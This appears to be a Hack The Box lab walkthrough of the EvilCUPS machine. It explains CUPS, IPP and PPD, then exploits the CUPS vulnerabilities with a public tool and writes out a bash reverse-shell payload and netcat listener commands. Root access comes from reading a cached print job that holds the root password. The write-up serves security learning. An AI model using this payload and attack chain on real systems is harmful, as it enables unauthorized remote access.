+++
tags = ["Box", "HTB", "Medium", "LINUX", "CVE-2024-4176", "CVE-2024-4175", "CVE-2024-4177", "CVE-2024-4076", "CUPS"]
draft = false
title = "EvilCUPS HTB Walkthrough"
author = "bloodstiller"
date = 2024-10-22
toc = true
bold = true
next = true
+++

## EvilCUPS Hack The Box Walkthrough/Writeup: {#evilcups-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/EvilCUPS>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -Pn -oA TCPbasicScan`
        ```shell
          kali in 46.02-HTB/BlogEntriesMade/EvilCups/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
          🕙 07:16:48 zsh ❯ nmap $box -Pn -oA basicScan
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 07:16 BST
          Nmap scan report for 10.129.231.157
          Host is up (0.036s latency).
          Not shown: 998 closed tcp ports (reset)
          PORT    STATE SERVICE
          22/tcp  open  ssh
          631/tcp open  ipp

          Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds

        ```
    -   **Initial thoughts**:
        -   I am doing this box purely to understand the recent [CVE-2024-47176](https://nvd.nist.gov/vuln/detail/CVE-2024-47176) further so know that 631 will be interesting.

-   **Basic UDP Scan**:
    -   `sudo nmap $box -sU -Pn -oA UDPbasicScan`
        ```shell
          kali in 46.02-HTB/BlogEntriesMade/EvilCups/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
          🕙 07:17:00 zsh ❯ sudo nmap $box -sU -Pn -oA UDPbasicScan
          [sudo] password for kali:
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 07:21 BST
          Stats: 0:05:57 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
          UDP Scan Timing: About 35.08% done; ETC: 07:38 (0:10:50 remaining)
          Stats: 0:16:46 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
          UDP Scan Timing: About 96.55% done; ETC: 07:38 (0:00:36 remaining)
          Nmap scan report for 10.129.231.157
          Host is up (0.035s latency).
          Not shown: 997 closed udp ports (port-unreach)
          PORT     STATE         SERVICE
          68/udp   open|filtered dhcpc
          631/udp  open|filtered ipp
          5353/udp open|filtered zeroconf
          
          Nmap done: 1 IP address (1 host up) scanned in 1050.49 seconds

        ```

-   **Initial thoughts**:
    -   As expected IPP and CUPS.


### CUPS `631`: {#cups-631}

-   **As we know** `CUPS` **is running we can visit the web server by visiting** `http://[ip]:631`
    -   {{< figure src="/ox-hugo/2024-10-22-073523_.png" >}}

-   **I try the** `administration` **button but this is denied**:
    -   {{< figure src="/ox-hugo/2024-10-22-073752_.png" >}}


#### Common UNIX Printing System (CUPS) Primer: {#common-unix-printing-system--cups--primer}

-   **What is CUPS?**:
    -   CUPS (Common UNIX Printing System) is an open-source printing system developed by Apple for macOS, Linux, and other UNIX-like operating systems.
    -   It allows a computer to act as a print server, enabling clients to send print jobs to printers using Internet Printing Protocol (IPP) and other protocols.
    -   Supports printing to both local and network printers, handling print queues and printer management.

-   **Key Features of CUPS**:
    -   **Print Server Functionality**:
        -   Manages printers and print jobs on both local machines and networked environments.
    -   **Protocol Support**:
        -   Uses IPP as its core protocol but also supports older protocols such as Line Printer Daemon (LPD), Server Message Block (SMB), and more.
    -   **Driver Flexibility**:
        -   Allows the use of a variety of printer drivers, supporting a wide range of printers.
    -   **Web Interface**:
        -   Provides a web-based interface for configuring printers, managing jobs, and accessing logs.
    -   **Authentication and Security**:
        -   Supports various authentication methods (e.g., Basic, Digest, Kerberos) and encrypts connections using TLS to ensure secure printing.

-   **How CUPS Works**:
    -   **Queue System**:
        -   CUPS handles print jobs by placing them in a queue, where they are processed and sent to the printer in the order they are received.
    -   **Backend System**:
        -   CUPS uses backends to communicate with printers. The most common backend is IPP, but others like USB and LPD are also available.
    -   **Filters**:
        -   CUPS uses filters to convert print data from application formats (like PDF or PostScript) into formats the printer can understand.

-   **Security Considerations**:
    -   CUPS exposes ports (usually `631` for IPP) which, if misconfigured, could lead to unauthorized access.
    -   Proper configuration and updates are critical to avoid vulnerabilities, especially in networked environments where CUPS could be exploited remotely.


#### Internet Printing Protocol (IPP) Primer: {#internet-printing-protocol--ipp--primer}

-   **Definition**:
    -   IPP is a network protocol used for communication between client devices and printers (or print servers). It allows for the submission, management, and control of print jobs over a network.
    -   It is the core protocol used by CUPS and other modern printing systems for handling print tasks.

-   **Key Features of IPP**:
    -   **Printing Control**:
        -   IPP enables clients to send print jobs to printers, cancel jobs, check the status of printers and jobs, and retrieve printer capabilities.
    -   **Standardization**:
        -   Defined by the Internet Engineering Task Force (IETF), IPP is a well-documented, standardized protocol.
    -   **Support for Secure Transmission**:
        -   IPP can use HTTP over SSL (HTTPS) to ensure secure, encrypted communication between client and server.
    -   **Advanced Printer Features**:
        -   Supports a wide range of printing features, such as duplex printing, media selection, and finishing options.

-   **How IPP Works**:
    -   **Job Submission**:
        -   Clients send print requests (in IPP format) to a printer or print server.
    -   **Job and Queue Management**:
        -   The protocol allows clients to monitor and manage print jobs, with the ability to query job status, hold jobs, or cancel them.
    -   **Communication**:
        -   IPP communicates over port 631 by default, using HTTP as the transport layer. This allows it to be integrated into web-based services.

-   **Security Features**:
    -   **Authentication and Encryption**:
        -   Supports various authentication mechanisms and encryption via TLS, ensuring only authorized users can submit or manage print jobs.
    -   **Access Control**:
        -   IPP can restrict access to certain users or devices, enhancing security in environments with multiple users.

-   **Common Use**:
    -   IPP is used in most modern networked printers and printing systems (like CUPS) due to its flexibility, security features, and ability to handle complex printing tasks.
    -   IPP's versatility and security make it a preferred protocol for managing printers, especially in networked environments


#### PostScript Printer Description (PPD) Primer: {#postscript-printer-description--ppd--primer}

-   **What is a PPD File?**
    -   A PostScript Printer Description (PPD) file is a configuration file used by printing systems to describe the capabilities and features of a PostScript printer.
    -   PPD files provide detailed information about the printer's features, such as supported paper sizes, resolution, duplexing, and more.
    -   A PPD contains the PostScript commands (code) which is used to invoke features for the print job handled by that printer.

-   **Purpose of a PPD File**:
    -   **Printer Configuration**:
        -   PPD files allow the operating system and printing system (e.g., CUPS) to configure the printer correctly.
    -   **Feature Customization**:
        -   They describe optional features like trays, memory, or color modes, enabling users to select these features during printing.

-   **Structure of a PPD File**:
    -   **Header**:
        -   Contains general information about the printer, such as its model name, manufacturer, and supported languages.
    -   **Printer Capabilities**:
        -   Details the specific print features like:
            -   Supported page sizes (e.g., A4, Letter)
            -   Print resolution (e.g., 600 DPI, 1200 DPI)
            -   Duplex printing capabilities (automatic double-sided printing)
    -   **Option Keywords**:
        -   Defines selectable options for users, such as media types, color modes, or finishing options like stapling or punching.

-   **How a PPD File Works**:
    -   When a print job is initiated, the PPD file helps the system translate the print request into a format the printer can understand.
    -   It provides the necessary instructions for the printer driver to produce the correct output by interpreting the selected options (resolution, paper size, etc.).

-   **Common Use Cases**:
    -   **PostScript Printers**:
        -   Primarily used for configuring PostScript printers, but they can also be used by CUPS to manage non-PostScript printers by mapping specific print features.
    -   **Driver Customization**:
        -   Often included with printer drivers or downloaded from the printer manufacturer’s website, ensuring that all printer features are available to the user.

-   **Security and Maintenance**:
    -   **Misconfiguration Issues**:
        -   Incorrect or outdated PPD files may lead to misconfiguration of print jobs, causing print failures or reduced functionality.
    -   **Modifications**:
        -   PPD files can be edited manually to customize printer behavior, though improper editing may lead to errors or printing issues.


### Attack Chain: {#attack-chain}

-   **If you would like a deeper dive: I have written a deep dive of this exploitation chain which you can find here**:
    -   +Deep Dive+: <https://bloodstiller.com/articles/understandingcupsexploitation>

-   **Attack Chain Summarized**:
    -   Force the target machine to connect back to our malicious `IPP` server by sending a crafted packet to port `631` thereby starting the process of creating a fake printer.
    -   Return a malicious `IPP` attribute string to inject our controlled `PPD` directives to the temporary file.
    -   Either print a test page from our fake printer if we have access to the `CUPS` web panel to trigger the `PPD` directives (and our commands) to be executed or wait for a print job to be sent to the fake printer.


## 2. Foothold: {#2-dot-foothold}


### Exploiting the CUPS vulnerabilities to get a low privilege shell: {#exploiting-the-cups-vulnerabilities-to-get-a-low-privilege-shell}


#### Preparing the CUPS Exploit: {#preparing-the-cups-exploit}

-   **I will be using ippsec's cups exploit for this attack**:
    -   <https://github.com/ippsec/evil-cups>

-   **Preparing Exploit**:
    -   `git clone https://github.com/IppSec/evil-cups.git`
    -   `cd evil-cups`
-   **Prepare Python Venv**:
    -   `python3 -m venv evilCups`
    -   `source evilCups/bin/activate`
    -   +Note+: I use venv's as it allows me to install different deps without causing conflicts with my base python installation.
-   **Install Requirements**:
    -   `pip3 install -r requirements.txt`


#### Running the CUPS Exploit: {#running-the-cups-exploit}

1.  **Running the exploit to send the payload**:
    -   `python3 evilcups.py [AttackIP] [VictimIP] "bash -c 'bash -i >& /dev/tcp/[AttackIP]/[AttackPort] 0>&1'"`
    -   `python3 evilcups.py 10.10.14.58 $box "bash -c 'bash -i >& /dev/tcp/10.10.14.58/443 0>&1'"`
    -   {{< figure src="/ox-hugo/2024-10-22-095213_.png" >}}
    -   Now the payload is sent we can move onto the next stage of triggering the exploit:

2.  **Start our listener**:
    -   `rlwrap -cAr nc -lnvp 443`

3.  **Trigger the exploit**:
    -   Navigating the CUPS web-console we can see our malicious printer is listed:
        -   {{< figure src="/ox-hugo/2024-10-22-090825_.png" >}}

    -   **Printing our test page to trigger the exploit**:
        -   In order to activate the exploit and trigger the malicious PPD directives we need to either wait for a print job to be sent to the fake printer or we can trigger one ourselves using the "`Test Print`" functionality.
        -   {{< figure src="/ox-hugo/2024-10-22-090909_.png" >}}

4.  **Low Priv Shell Caught**:
    -   {{< figure src="/ox-hugo/2024-10-22-095152_.png" >}}
    -   {{< figure src="/ox-hugo/2024-10-22-095738_.png" >}}

5.  **Get our User Flag**:
    -   {{< figure src="/ox-hugo/2024-10-22-095757_.png" >}}


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Reading Cached Print Queues to retrieve the Root Password: {#reading-cached-print-queues-to-retrieve-the-root-password}

-   **Checking for print jobs in the CUPS web console**:
    -   As this is a printer based machine lets check if there are any interesting print jobs.
    -   Navigating to the web-console &amp; clicking on Jobs we can see a single job is listed for the authentic printer `Canon_MB2300_series`
        -   {{< figure src="/ox-hugo/2024-10-22-102833_.png" >}}
        -   You may notice the `-1` after this tells us this is the first print job for this printer. (more on this soon)

-   **Trying to read the cached Jobs**:
    -   `CUPS` keeps it's cached jobs in the default location: `/var/spool/cups/` however when I try and list the contents of the folder I get the following error:
        -   {{< figure src="/ox-hugo/2024-10-22-112040_.png" >}}

-   **Discovering we have executable rights over the folder**:
    -   Listing the contents of `/var/spools` we can see we have execute privileges on the `cups` directory but we cannot list the contents:
        -   {{< figure src="/ox-hugo/2024-10-22-112104_.png" >}}
        -   This means if we can establish the file-name for any files in the folder we can execute `cat` etc on the file to list the contents.

-   **Default naming structure format for cached Print jobs**:
    -   The naming structure for completed jobs in the `cups` directory is as follows:
        -   `d-[print job]-[page number]`
            -   `d` = The cached print job files in the CUPS directory are always prefixed with "d".
            -   Print job = 5 digits (e.g. `00001`)
            -   Page number = 3 digits (e.g. `001`)
        -   As we know there is only 1 printer, `Canon_MB2300_series` &amp; it had only 1 job (see below) therefore we can infer the file will be called `d00001-001`.
            -   {{< figure src="/ox-hugo/2024-10-22-112926_.png" >}}

-   **Extracting the root password from the cached job**:
    -   `cat /var/spool/cups/d00001-001`
    -   {{< figure src="/ox-hugo/2024-10-22-113055_.png" >}}
    -   Scrolling down we can get root users pass:
    -   {{< figure src="/ox-hugo/2024-10-22-100359_.png" >}}

    -   +Note+: This is very CTF, but I don't mind.


## 4. Ownership: {#4-dot-ownership}


### SSH'ing As Root to get the root flag: {#ssh-ing-as-root-to-get-the-root-flag}

-   **SSH back in as root**:
    -   {{< figure src="/ox-hugo/2024-10-22-100444_.png" >}}

-   **Get Root Flag**:
    -   {{< figure src="/ox-hugo/2024-10-22-100548_.png" >}}


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  Reading the <https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/> I learned ALOT about CUPS, PPD, IPP etc.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Forgot a closing quotation mark a few times, that was fun.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


